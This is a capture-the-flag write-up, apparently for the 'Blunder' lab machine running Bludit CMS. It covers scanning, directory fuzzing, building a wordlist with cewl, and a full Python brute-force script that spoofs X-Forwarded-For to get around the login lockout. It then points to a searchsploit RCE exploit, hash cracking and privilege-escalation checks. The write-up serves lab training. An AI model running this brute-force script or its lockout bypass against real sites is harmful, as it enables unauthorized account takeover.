### Scanning process
nmap ip:
``` 
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-generator: Blunder
| http-title: Blunder | A blunder of interesting facts
| http-server-header: Apache/2.4.41 (Ubuntu)
``` 

So we can investigate the main page of this ip. Then we can use wfuzz to find some other directories of it and we will see 'http://10.10.10.191/admin' and it is a login page. 

Try with the most common credentials but unfortunatly you cannot access to it.

We can search for txt extension with wfuzz and it will has a todo.txt page with a valid username that we can use late.


### Scripting in python
A very commom practice, when we have a lot of word in the main page, is to use the word of the own page to guest the password. There is a utility named 'cewl' which will create a dictionary.
  'cewl -w dictionary.txt http://10.10.10.191'

Now we can do a script in python to crack the password:

``` python
#!/usr/bin/python3
from pwn import *
import signal, os, time, requests, pdb, re

# Variables globales
file_name = "dictionary.txt"
main_url = "http://10.10.10.191/admin/login"

def handler(signum, frame):
    print("\n\n[!] Saliendo del programa.")
    sys.exit( -1 )

def bruteForce():
    s = requests.session()
    f = open(file_name, 'r')
    p1 = log.progress("Brute Force")
    p1.status("Starting attack")
    time.sleep(2)
    count = 1

    for passwd in f.readlines():
        passwd = passwd.strip('\n')
        p1.status( "Testing password [%d/349]: %s" % (count, passwd))
        r = s.get(main_url)
        token = re.findall(r'name="tokenCSRF" value="(.*?)"', r.text)[0]
        
        headers = {
            'X-Forwarded-For': '%s' % passwd
        }
        post_data = {
            'tokenCSRF': token,
            'username': 'fergus',
            'password': '%s' % passwd,
            'save': ''
        }
        r = s.post(main_url, data=post_data, headers=headers)
        
        if( "Username or password incorrect" not in r.text ):
            p1.success( "Password is %s" % passwd )
            break
        count += 1

signal.signal(signal.SIGINT, handler) 

if __name__ == "__main__":
  bruteForce()
```

We will get a valid credential...

Now it is time to get a vulnerability that let us remote command execution (RCE): Searchsploit Bludit and select Directory traversal. Follow this script and you are finally inside of the machine.

### Privilege scalation
Take a look of where is the user.txt flag. `find / \-name user.txt 2> /dev/null`

So it seems that we have to migrate to hugo. Let's take a look of the bludit content and there is a 'users.php' file which content a hash. We can crack it online with crackstation.net

Migrate to hugo and then search for privilege: `sudo -l`
